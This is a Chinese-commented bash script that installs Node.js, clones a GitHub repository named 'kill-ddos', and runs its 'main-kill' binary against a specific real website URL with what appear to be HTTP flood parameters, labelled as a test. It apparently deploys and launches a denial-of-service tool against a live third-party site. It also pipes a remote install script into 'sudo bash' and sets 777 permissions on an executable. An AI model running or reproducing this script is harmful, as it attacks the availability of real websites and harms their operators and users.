#!/bin/bash

# 检查是否已安装 Node.js
if ! command -v node &> /dev/null; then
  echo "未找到 Node.js，正在安装 Node.js..."
  
  # 使用 curl 下载并运行 Node.js 安装脚本
  curl --silent --location https://rpm.nodesource.com/setup_16.x | sudo bash -
  
  # 使用 yum 安装 Node.js
  sudo yum -y install nodejs
  
  echo "Node.js 安装完成。"
fi

# 检查已安装的 Node.js 版本
node_version=$(node -v)
echo "已安装的 Node.js 版本: $node_version"

# 提取主版本号
major_version=${node_version:1:2}

# 判断是否需要升级
if [ $major_version -lt 16 ]; then
  echo "Node.js 版本较旧，正在升级 Node.js..."

  # 安装 n 模块，用于管理 Node.js 版本
  sudo npm install n -g

  # 安装指定版本的 npm
  sudo npm install -g npm@9.6.7

  # 清除 npm 缓存
  npm cache clean -f

  # 查看可用的 Node.js 版本
  npm view node versions

  # 安装 Node.js 16.20.0
  n 16.20.0

  echo "Node.js 升级完成。"
else
  echo "Node.js 版本已经是 16 或更高。无需升级。"
fi

# 验证 Node.js 版本
node -v

# 安装 git

yum install git -y

# 克隆 GitHub 项目到本地
echo "正在克隆 GitHub 项目..."
git clone https://github.com/likelisi99/kill-ddos.git
echo "GitHub 项目克隆完成。"

# 进入项目目录
cd kill-ddos

# 安装依赖
echo "正在安装依赖..."
npm install
echo "依赖安装完成。"

# 赋予执行权限
chmod 777 main-kill

# 执行命令并进行测试
echo "执行命令并进行测试..."
./main-kill 1 http://www.ispqq.cn/public/dadaikuan/ 1 http.txt http1.1

echo "测试完成。"
